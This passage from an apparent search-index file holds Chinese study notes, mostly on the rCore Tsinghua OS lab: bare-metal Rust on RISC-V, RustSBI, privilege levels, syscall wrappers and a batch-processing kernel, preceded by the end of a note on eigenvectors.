<p>\u8fd9\u76f8\u5f53\u4e8e\u4e3a\u77e9\u9635\u5f15\u5165\u4e86\u53e6\u4e00\u79cd\u51e0\u4f55\u89c6\u89d2\uff0c\u6211\u4eec\u4e0d\u7528\u518d\u5173\u6ce8\u5750\u6807\u7cfb\uff0c\u800c\u662f\u6ce8\u91cd\u4e8e\u7279\u5f81\u5411\u91cf\u7684\u53d8\u5316</p> <p>\u6bd4\u5982\u8bf4\u4e09\u7ef4\u53d8\u6362\uff0c\u5982\u679c\u7279\u5f81\u503c\u4e3a1\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u4f5c\u4ee5\u7279\u5f81\u5411\u91cf\u4e3a\u8f74\u8fdb\u884c\u65cb\u8f6c</p> <p></p> <p>\u6c42\u89e3\u7279\u5f81\u5411\u91cf\u8981\u5982\u6b64\u64cd\u4f5c\u4e0a\u56fe\u4e2dv\u662f\u4e00\u4e2a\u7279\u5f81\u5411\u91cf</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/","title":"rCore \u6e05\u534e\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u9a8c Part1","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#1","title":"1. \u5e94\u7528\u7a0b\u5e8f\u548c\u57fa\u672c\u6267\u884c\u73af\u5883","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#11","title":"1.1 \u79fb\u9664\u6807\u51c6\u5e93\u4f9d\u8d56\uff0c\u8f6c\u5411\u88f8\u673a\u7f16\u7a0b","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>strace</code>\u200b\u8d28\u91cf\u67e5\u770b\u5185\u90e8\u7cfb\u7edf\u8c03\u7528\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5728\u73b0\u4ee3\u7684linux\u7cfb\u7edf\u4e0a\uff0c\u5373\u4fbf\u5728\u4ee3\u7801\u4e0a\u6bdb\u4e5f\u4e0d\u5e72\u7684\u7a0b\u5e8f\u4e5f\u4f1a\u7ecf\u5386\u591a\u6b21\u7cfb\u7edf\u8c03\u7528</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5207\u6362rust\u7a0b\u5e8f\u8fd0\u884c\u7684\u5e73\u53f0\uff0c\u8ba9\u5176\u8fd0\u884c\u5728\u7c7b\u4f3c\u4e8e\u88f8\u673a\u5668\u7684\u5e73\u53f0\u4e0a <code>cargo run --target riscv64gc-unknown-none-elf</code>\u200b\uff0c\u4e0a\u8ff0\u6307\u4ee4\u5c06\u6211\u4eec\u8f6c\u5411\u4e00\u4e2a\u4e0d\u5b58\u5728\u4efb\u4f55\u64cd\u4f5c\u7cfb\u7edf\u652f\u6301\u7684\u5e73\u53f0\u3002</p> <p>\u200b\u200b</p> <p>rust\u7684std\u548ccore</p> <ul> <li>std\u662frust\u8de8\u5e73\u53f0\u5f00\u53d1\u4f7f\u7528\u7684\u6807\u51c6\u5e93\uff0c\u5185\u90e8\u5305\u542b\u4e86\u8bb8\u591a\u50cf<code>println!</code>\u200b\u548c<code>Option</code>\u200b\u4e00\u6837\u5e38\u7528\u7684\u5b8f\u548c\u7c7b</li> <li>core\u5185\u90e8\u7684\u529f\u80fd\u662fstd\u7684\u6d53\u7f29\u7248\uff0c\u4f46\u662f\u597d\u5904\u5728\u4e8e\u5176\u53ef\u4ee5\u76f4\u63a5\u5728\u88f8\u673a\u5e73\u53f0\u4e0a\u8fd0\u884c</li> </ul> <p>\u8ba1\u7b97\u673a\u7684\u542f\u52a8\u8fc7\u7a0b</p> <p>\u6211\u4eec\u5728\u88f8\u673a\u4e0a\u7f16\u7a0b\u7684\u65f6\u5019\uff0c\u9996\u5148\u81ea\u7136\u8981\u5173\u6ce8\u6574\u4e2a\u8ba1\u7b97\u673a\u7684\u542f\u52a8\u8fc7\u7a0b\uff0c\u57fa\u672c\u53ef\u4ee5\u8ba4\u4e3a\u662f\u6211\u4eec\u7684\u7535\u8111\u4f1a\u5148\u8df3\u8f6c\u5230\u4e00\u4e9b\u56fa\u5b9a\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u6267\u884c\u4e00\u4e9b\u56fa\u5b9a\u7684\u4ee3\u7801\uff0c\u6700\u7ec8\u628a\u786c\u4ef6\u7684\u63a7\u5236\u6743\u4ea4\u7ed9\u64cd\u4f5c\u7cfb\u7edf</p> <p>\u800crCore\u5728\u672c\u7ae0\u4e3a\u6211\u4eec\u5b9e\u64cd\u4e86\u7f16\u5199\u4e86\u5185\u6838\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\uff0c\u901a\u8fc7\u624b\u5199\u6c47\u7f16\u7684\u65b9\u5f0f\uff0c\u5e76\u4e14\u4f7f\u5176\u52a0\u8f7d\u5230qemu\u4e0a</p> <p>\u4e00\u4e2a\u5c0f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u76f4\u63a5\u5728\u8fd9\u91cc\u4f7f\u7528Rust\u4ee3\u7801</p> <p>\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u76f4\u63a5\u5728\u88f8\u673a\u4e0a\u7f16\u7a0b\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u751a\u81f3\u4e0d\u80fd\u6709\u6548\u5730\u627e\u5230Rust\u4ee3\u7801\u7684main\u51fd\u6570\u5728\u54ea\u91cc\uff0c\u5728\u6211\u4eec\u80fd\u591f\u4f7f\u7528\u6807\u51c6\u5e93\u7684\u65f6\u5019\uff0c\u5728main\u51fd\u6570\u4e4b\u524d\u6807\u51c6\u5e93\u4f1a\u4e3a\u6211\u4eec\u505a\u597d\u521d\u59cb\u5316\u5de5\u4f5c\u3002</p> <p>\u5728\u6211\u4eec\u7981\u6b62\u4f7f\u7528std\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5148\u7f16\u5199\u4e00\u4e9b\u6c47\u7f16\u4ee3\u7801\uff0c\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c\u3002</p> <p>\u57fa\u4e8eGDB\u7684\u68c0\u9a8c</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u53d1\u73b0\u7cfb\u7edf\u521d\u59cb\u572801000\u5904\uff0c\u7ecf\u8fc7\u4e00\u7cfb\u5217\u521d\u59cb\u5316\u5de5\u4f5c\u540e\uff0c\u6211\u4eec\u8df3\u8f6c\u5230\u6211\u4eec\u4e4b\u524d\u8bbe\u5b9a\u76840x80200000\u5904\uff0c\u53d1\u73b0\u6211\u4eec\u8bbe\u5b9a\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u786e\u5b9e\u5df2\u7ecf\u88ab\u52a0\u8f7d</p> <p>\u200b\u200b</p> <p>\u524d\u671f\u6709\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\u662fRUSTSBI\u4e3a\u6211\u4eec\u505a\u7684\uff0c\u57fa\u672c\u7684\u884c\u4e3a\u5c31\u662f\u524d\u6587\u63d0\u5230\u7684\uff0c\u628a\u5185\u6838\u52a0\u8f7d\u8fdb\u6765</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#12-rust","title":"1.2 \u4ece\u6c47\u7f16\u8f6c\u56deRust","text":"<p>\u6211\u4eec\u5728\u4e4b\u524d\u53d1\u73b0\u7cfb\u7edf\u627e\u4e0d\u5230main\u51fd\u6570\u7684\u60c5\u51b5\uff0c\u5728RISCV\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u4e3b\u8981\u4f9d\u8d56\u4e24\u7ec4\u6307\u4ee4</p> <ul> <li>jal / jalr</li> <li>ret</li> </ul> <p>\u9664\u4e86\u8fd9\u4e24\u4e2a\u6307\u4ee4\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u5bf9\u51fd\u6570\u8c03\u7528\u65f6\u5f71\u54cd\u7684\u5bc4\u5b58\u5668\u7528\u7269\u7406\u5185\u5b58\u8fdb\u884c\u4fdd\u5b58\uff0c\u8fd9\u4e00\u70b9riscv\u4e5f\u662f\u533a\u5206\u4e86\u8c03\u7528\u8005\u4fdd\u5b58\u548c\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u3002</p> <p>\u66f4\u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u8fd9\u4e9b\u5bc4\u5b58\u5668\u5b58\u5728\u7269\u7406\u5185\u5b58\u7684\u4f55\u5904\uff0c\u5bf9\u4e8e\u51fd\u6570\u8c03\u7528\u4ea7\u751f\u7684\u8fd9\u4e9b\u5bc4\u5b58\u5668\u4fdd\u5b58\uff0c\u4f1a\u5b58\u5728\u6808\u4e0a\uff0c\u7528sp\u5bc4\u5b58\u5668\u5b58\u50a8\u6808\u5730\u5740</p> <p>\u200b\u200b</p> <p>\u800c\u5728\u88f8\u673a\u7f16\u7a0b\u4e2d\uff0c\u7f16\u8bd1\u7cfb\u7edf\u4e0d\u77e5\u9053\u6211\u4eec\u4e3a\u7a0b\u5e8f\u5206\u914d\u4e86\u591a\u5c11\u7684\u6808\u7a7a\u95f4\uff0c\u4e5f\u4e0d\u77e5\u9053\u6808\u7a7a\u95f4\u4ece\u54ea\u91cc\u5f00\u59cb\uff0c\u56e0\u6b64\u9700\u8981\u6211\u4eec\u901a\u8fc7\u6c47\u7f16\u4ee3\u7801\u624b\u52a8\u8bbe\u5b9a</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#13-rustsbi","title":"1.3 \u4f7f\u7528RustSBI","text":"<p>RustSBI \u662f\u4e00\u4e2a\u4ecb\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u4e4b\u95f4\u7684\u5b58\u5728\uff0c\u5bf9\u4e8eriscv\u7cfb\u7edf\u800c\u8a00\uff0c\u6211\u4eec\u7f16\u5199\u7684 OS \u5185\u6838\u4f4d\u4e8e Supervisor \u7279\u6743\u7ea7\uff0c\u800c RustSBI \u4f4d\u4e8e Machine \u7279\u6743\u7ea7\uff0c\u4e5f\u662f\u6700\u9ad8\u7684\u7279\u6743\u7ea7\u3002</p> <p>\u901a\u8fc7sbi\u4e3a\u6211\u4eec\u63d0\u4f9b\u7684\u529f\u80fd\uff0c\u6211\u4eec\u80fd\u591f\u5b9e\u73b0\u8f93\u51fa</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#14","title":"1.4 \u6e90\u7801\u5206\u6790","text":"<p>\u8fd9\u4e00\u90e8\u5206\u7684\u6e90\u4ee3\u7801\u76f8\u5f53\u7b80\u5355\uff0c\u4ec5\u4ec5\u662f\u5bf9\u4e8eSBI\u4e3a\u6211\u4eec\u63d0\u4f9b\u7684\u63a5\u53e3\u505a\u4e86\u4e00\u4e9b\u5c01\u88c5\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u8fdb\u884c\u8f93\u51fa</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#2","title":"2. \u6279\u5904\u7406\u7cfb\u7edf","text":"<p>\u5728\u6279\u5904\u7406\u7cfb\u7edf\u4e4b\u524d\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u6bcf\u4e00\u4efd\u4ee3\u7801\u90fd\u662f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u6709\u4e86\u6279\u5904\u7406\u7cfb\u7edf\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u7528\u7a0b\u5e8f\u81ea\u52a8\u5730\u628a\u5176\u4ed6\u7684\u4ee3\u7801\u52a0\u8f7d\u5230\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u4e5f\u5c31\u6709\u4e86\u6240\u8c13\u7528\u6237\u548c\u5185\u6838\u7684\u533a\u522b\u3002</p> <p>\u672c\u7ae0\u5b9e\u73b0\u7684\u64cd\u4f5c\u7cfb\u7edf\u7684\u76ee\u6807\u5728\u4e8e\u80fd\u591f\u628a\u6709\u7684\u7a0b\u5e8f\u4e00\u4e2a\u4e00\u4e2a\u52a0\u8f7d\u5230\u64cd\u4f5c\u7cfb\u7edf\u91cc\uff0c\u76f4\u5230\u6240\u6709\u7684\u7cfb\u7edf\u90fd\u6267\u884c\u5b8c</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#21","title":"2.1 \u7279\u6743\u673a\u5236","text":"<p>\u8fd9\u4e00\u90e8\u5206\u4e3a\u6211\u4eec\u89e3\u7b54\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7cfb\u7edf\u8c03\u7528\u548c\u666e\u901a\u7684\u51fd\u6570\u8c03\u7528\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u4e3b\u8981\u662f\u51fa\u4e8e\u5b89\u5168\u6027\u8d28\u7684\u8003\u8651\uff0c\u6211\u4eec\u9700\u8981\u8f6f\u786c\u4ef6\u534f\u8c03\u5730\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002\u5728\u4e0a\u4e00\u7ae0\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4ec5\u4f5c\u4e3a\u4e00\u4e2a\u5e93\u5b58\u5728\uff0c\u7cfb\u7edf\u628a\u5e94\u7528\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u5e93\u7f16\u8bd1\u94fe\u63a5\u5728\u4e00\u8d77\uff0c\u5bfc\u81f4\u4e86\u5e94\u7528\u7a0b\u5e8f\u62e5\u6709\u548c\u64cd\u4f5c\u7cfb\u7edf\u76f8\u540c\u7684\u6743\u9650\u3002</p> <p>\u56e0\u6b64\u672c\u7ae0\u7684\u91cd\u8981\u76ee\u6807\u5728\u4e8e\uff0c\u8ba9\u5e94\u7528\u7a0b\u5e8f\u4e0d\u80fd\u6267\u884c\u67d0\u4e9b\u53ef\u80fd\u7834\u574f\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6307\u4ee4</p> <p>\u8fd9\u5c31\u6d89\u53ca\u5230\u672c\u8282\u63d0\u5230\u7684\u7279\u6743\u673a\u5236\uff0c\u8fd9\u4e00\u90e8\u5206\u9700\u8981\u8f6f\u786c\u4ef6\u534f\u540c\u5730\u5b9e\u73b0\uff0c\u5728\u786c\u4ef6\u65b9\u9762\uff0criscv\u7684CPU\u533a\u5206\u4e86\u4e0d\u540c\u7b49\u7ea7\u7684\u6267\u884c\u73af\u5883\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u80fd\u591f\u6267\u884c\u7684\u6307\u4ee4\uff0c\u5982\u679c\u5728\u4f4e\u7b49\u7ea7\u7684\u60c5\u51b5\u4e0b\u8c03\u7528\u9ad8\u7b49\u7ea7\u533a\u5206\u7684\u6307\u4ee4\uff0c\u5c31\u4f1a\u5bfc\u81f4\u62a5\u9519\u3002\u5e76\u4e14\u5728\u6267\u884c\u73af\u5883\u8df3\u8f6c\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528\u4e24\u7c7b\u7279\u6b8a\u7684\u6307\u4ee4</p> <ul> <li>\u200b<code>ecall</code>\u200b \u5177\u6709\u7528\u6237\u6001\u5230\u5185\u6838\u6001\u7684\u6267\u884c\u73af\u5883\u5207\u6362\u80fd\u529b\u7684\u51fd\u6570\u8c03\u7528\u6307\u4ee4</li> <li>\u200b<code>eret</code>\u200b \u5177\u6709\u5185\u6838\u6001\u5230\u7528\u6237\u6001\u7684\u6267\u884c\u73af\u5883\u5207\u6362\u80fd\u529b\u7684\u51fd\u6570\u8fd4\u56de\u6307\u4ee4\uff0c\u8fd9\u91cc\u7279\u6307 <code>sret</code>\u200b</li> </ul> <p>\u5728\u8f6f\u4ef6\u65b9\u9762\uff0c\u64cd\u4f5c\u7cfb\u7edf\u8981\u5728ecall\u548ceret\u524d\u540e\u8fdb\u884c\u4e00\u5b9a\u7684\u68c0\u67e5\u548c\u6062\u590d\u5de5\u4f5c</p> <p>\u7cfb\u7edf\u8c03\u7528\u7684\u672c\u8d28\u5c31\u662f\u5185\u6838\u4e0e\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u63a5\u53e3\uff0c\u79f0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u4e8c\u8fdb\u5236\u63a5\u53e3ABI\uff0c\u8fd9\u79cd\u63a5\u53e3\u662f\u4e8c\u8fdb\u5236\uff0c\u53ea\u80fd\u901a\u8fc7\u6c47\u7f16\u7801\u5b9e\u73b0</p> <p>\u5728riscv\u4e2d\u6709\u4e24\u7c7b\u7279\u6743\u6307\u4ee4</p> <ul> <li>\u6307\u4ee4\u672c\u8eab\u5c5e\u4e8e\u9ad8\u7279\u6743\u7ea7\u7684\u6307\u4ee4\uff0c\u5982 <code>sret</code>\u200b \u6307\u4ee4\uff08\u8868\u793a\u4ece S \u6a21\u5f0f\u8fd4\u56de\u5230 U \u6a21\u5f0f\uff09\u3002</li> <li>\u6307\u4ee4\u8bbf\u95ee\u4e86 S\u6a21\u5f0f\u7279\u6743\u7ea7\u4e0b\u624d\u80fd\u8bbf\u95ee\u7684\u5bc4\u5b58\u5668 \u6216\u5185\u5b58\uff0c\u5982\u8868\u793aS\u6a21\u5f0f\u7cfb\u7edf\u72b6\u6001\u7684 \u63a7\u5236\u72b6\u6001\u5bc4\u5b58\u5668 <code>sstatus</code>\u200b \u7b49\u3002</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#22","title":"2.2 \u7528\u6237\u7a0b\u5e8f","text":"<p>\u8981\u5b9e\u73b0\u80fd\u88ab\u8be5\u64cd\u4f5c\u7cfb\u7edf\u52a0\u8f7d\u7684\u7528\u6237\u7a0b\u5e8f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u6709\u4e09\u90e8\u5206</p> <ul> <li>\u51c6\u5907\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3</li> <li>\u57fa\u672c\u7684\u5e94\u7528\u7a0b\u5e8f</li> <li>\u5185\u5b58\u5e03\u5c40\u8bbe\u8ba1</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6bcf\u4e00\u4e2a\u57fa\u672c\u5e94\u7528\u7a0b\u5e8f\u4e2d\u90fd\u5305\u542b\u4e86</p> <pre><code>#[macro_use]\nextern crate user_lib;\n</code></pre> <p>\u5f15\u5165\u4e86lib.rs\u91cc\u7684\u5185\u5bb9\u53ca\u5176\u5b50\u6a21\u5757\uff0c\u800clib.rs\u4e2d\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u90e8\u5206</p> <pre><code>#[no_mangle]\n#[link_section = \".text.entry\"]\npub extern \"C\" fn _start() -&gt; ! {\n    clear_bss();\n    exit(main());\n    panic!(\"unreachable after sys_exit!\");\n}\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u4f1a\u88ab\u653e\u5728\u5230text.entry\u5904\uff0c\u5e76\u4e14\u4f1a\u5728\u6e05\u7a7abss\u6bb5\u4e4b\u540e\u6267\u884c\u7528\u6237\u7a0b\u5e8f\u7684main\u51fd\u6570</p> <p>\u800c\u6211\u4eec\u5728linker.ld\u4e2d\u8bb0\u5f55\u4e86text.entry\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u5f00\u59cb\u7684\u4f4d\u7f6e</p> <p>\u5b9e\u73b0\u7cfb\u7edf\u8c03\u7528</p> <pre><code>fn syscall(id: usize, args: [usize; 3]) -&gt; isize {\n    let mut ret: isize;\n    unsafe {\n        asm!(\n            \"ecall\",\n            inlateout(\"x10\") args[0] =&gt; ret, // \u8be5\u5bc4\u5b58\u5668\u8f93\u5165args[0] \u8f93\u51faret\n            in(\"x11\") args[1],               // \u4e0b\u9762\u4e09\u4e2a\u5bc4\u5b58\u5668\u90fd\u8f93\u5165\u76f8\u5e94\u53c2\u6570\n            in(\"x12\") args[2],\n            in(\"x17\") id\n        );\n    }\n    ret\n}\n</code></pre> <p>\u672c\u7ae0\u7684\u7cfb\u7edf\u8c03\u7528\u88ab\u5c01\u88c5\u4e3a\u8fd9\u4e2a\u51fd\u6570\uff0c\u7cfb\u7edf\u8c03\u7528\u672c\u8eab\u8d85\u51fa\u4e86Rust\u8bed\u8a00\u7684\u8868\u8fbe\u8303\u56f4\uff0c\u9700\u8981\u91c7\u7528\u6c47\u7f16\u4ee3\u7801\uff0c<code>asm!</code>\u200b\u662fRust\u8bed\u8a00\u7684\u6c47\u7f16\u5b8f\uff0c\u53ef\u4ee5\u5c06\u6c47\u7f16\u4ee3\u7801\u5d4c\u5165Rust\u8bed\u8a00\u7684\u4e0a\u4e0b\u6587</p> <p>\u540e\u7eed\u7684\u5404\u79cd\u7cfb\u7edf\u8c03\u7528\u51fd\u6570\uff0c\u90fd\u662f\u5bf9\u4e8e<code>syscall</code>\u200b\u8fdb\u884c\u4e86\u5c01\u88c5</p> <pre><code>pub fn sys_write(fd: usize, buffer: &amp;[u8]) -&gt; isize {\n    syscall(SYSCALL_WRITE, [fd, buffer.as_ptr() as usize, buffer.len()])\n}\n</code></pre> <p>\u8fd9\u91cc\u8981\u6ce8\u610f<code>&amp;[u8]</code>\u200b\u8fd9\u4e2a\u5207\u7247\uff0c\u8fd9\u662f\u4e00\u4e2a\u80d6\u6307\u9488\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210bytes\u4e4b\u540e\u5c31\u662f\u8fd9\u4e2a\u7c7b\u578b\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5176\u5730\u5740\u548c\u957f\u5ea6\u4f5c\u4e3a\u53c2\u6570</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#23","title":"2.3 \u6279\u5904\u7406\u64cd\u4f5c\u7cfb\u7edf","text":"<p>\u8fd9\u4e00\u90e8\u5206\u6211\u4eec\u6765\u5b9e\u73b0\u64cd\u4f5c\u7cfb\u7edf\uff0c\u9996\u5148\u6211\u4eec\u770bos\u76ee\u5f55\u4e0b\u7684main.rs</p> <pre><code>global_asm!(include_str!(\"entry.asm\"));\nglobal_asm!(include_str!(\"link_app.S\"));\n</code></pre> <p>\u53d1\u73b0\u6bd4\u8d77\u4e0a\u4e00\u7ae0\uff0c\u591a\u4e86\u4e00\u4e2a\u6c47\u7f16\u4ee3\u7801\u6587\u4ef6</p> <pre><code>    .section .data\n    .global app_0_start\n    .global app_0_end\napp_0_start:\n    .incbin \"../user/target/riscv64gc-unknown-none-elf/release/00hello_world.bin\"\napp_0_end:\n\n    .section .data\n    .global app_1_start\n    .global app_1_end\napp_1_start:\n    .incbin \"../user/target/riscv64gc-unknown-none-elf/release/01store_fault.bin\"\n...\n</code></pre> <p>\u4e0a\u9762\u4ec5\u4ec5\u662f\u622a\u53d6\u4e86\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u53d1\u73b0\uff0c\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u770b\u4f3c\u624b\u52a8\u628a\u4e00\u7cfb\u5217\u5e94\u7528\u7a0b\u5e8f\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\u52a0\u8f7d\u5230\u4e86\u5185\u5b58\u7684\u6307\u5b9a\u533a\u57df\uff0c\u5b9e\u9645\u4e0a\u662f\u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u81ea\u52a8\u751f\u6210\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5728user\u90e8\u5206\u589e\u52a0\u4e00\u4e2a<code>05say_goodbye.rs</code>\u200b\uff0c\u7136\u540e\u5728<code>make run</code>\u200b\u7684\u65f6\u5019\u5c31\u53d1\u73b0\u5b83\u5df2\u7ecf\u88ab\u52a0\u5165\u5230<code>link_app.S</code>\u200b\u4e2d\u4e86\uff0c\u4e5f\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c</p> <p>\u627e\u5230\u5e76\u4e14\u52a0\u8f7d\u5e94\u7528\u7a0b\u5e8f\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801</p> <p>\u6b64\u5904\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a<code>AppManager</code>\u200b</p> <pre><code>struct AppManager {\n    num_app: usize,\n    current_app: usize,\n    app_start: [usize; MAX_APP_NUM + 1],\n}\n</code></pre> <p>\u6211\u4eec\u81ea\u7136\u5e0c\u671b\u6709\u90a3\u4e48\u4e00\u4e2a\u5168\u5c40\u7684<code>AppManager</code>\u200b \u5bf9\u8c61\u6765\u5904\u7406\u5de5\u4f5c\uff0c\u4f46\u662f\u4e0d\u5e78\u7684\u662f\uff0cRust\u5bf9\u4e8e\u5168\u5c40\u53ef\u53d8\u53d8\u91cf\u975e\u5e38\u4e25\u683c\uff0c\u5982\u679c\u975e\u8981\u4f7f\u7528\u7684\u8bdd\u9700\u8981\u52a0\u4e0a\u5927\u91cf\u7684unsafe\u8bed\u53e5\u5757\uff0c\u5bfc\u81f4\u8fd9\u91cc\u589e\u52a0\u4e86\u5927\u91cf\u7684\u4ee3\u7801\u6765\u786e\u4fdd\u5b89\u5168\u6027</p> <p>\u9996\u5148\uff0c\u65e2\u7136\u4e0d\u80fd\u6709\u5168\u5c40\u53ef\u53d8\u53d8\u91cf\uff0c\u90a3\u4e48\u81ea\u7136\u4f1a\u8003\u8651\u4f7f\u7528<code>RefCell</code>\u200b\u8fd9\u7c7b\u5185\u90e8\u53ef\u53d8\u7684\u53d8\u91cf\uff0c\u4f46\u662f\u95ee\u9898\u53c8\u6765\u4e86\uff0cRust\u5bf9\u4e8e\u5168\u5c40\u53d8\u91cf\u7684\u8003\u91cf\uff0c\u4f1a\u81ea\u52a8\u8ba4\u4e3a\u8fd9\u4e2a\u53d8\u91cf\u9700\u8981\u8003\u8651\u7ebf\u7a0b\u5b89\u5168\uff0c\u56e0\u6b64\u53c8\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u4e8e\u662f\u6211\u4eec\u6700\u540e\u9009\u62e9\u4e86\u4e00\u4e2a\u6bd4\u8f83\u4e0d\u90a3\u4e48\u4f18\u96c5\u7684\u505a\u6cd5</p> <p>\u5b9e\u73b0\u7279\u6743\u7ea7\u7684\u5207\u6362</p> <p>\u57fa\u672c\u6211\u4eec\u662f\u9700\u8981\u5b9e\u73b0\u8fd9\u56db\u4e2a\u529f\u80fd</p> <ul> <li>\u5f53\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u7684\u65f6\u5019\uff0c\u9700\u8981\u521d\u59cb\u5316\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u6001\u4e0a\u4e0b\u6587\uff0c\u5e76\u80fd\u5207\u6362\u5230\u7528\u6237\u6001\u6267\u884c\u5e94\u7528\u7a0b\u5e8f\uff1b</li> <li>\u5f53\u5e94\u7528\u7a0b\u5e8f\u53d1\u8d77\u7cfb\u7edf\u8c03\u7528\uff08\u5373\u53d1\u51fa Trap\uff09\u4e4b\u540e\uff0c\u9700\u8981\u5230\u6279\u5904\u7406\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fdb\u884c\u5904\u7406\uff1b</li> 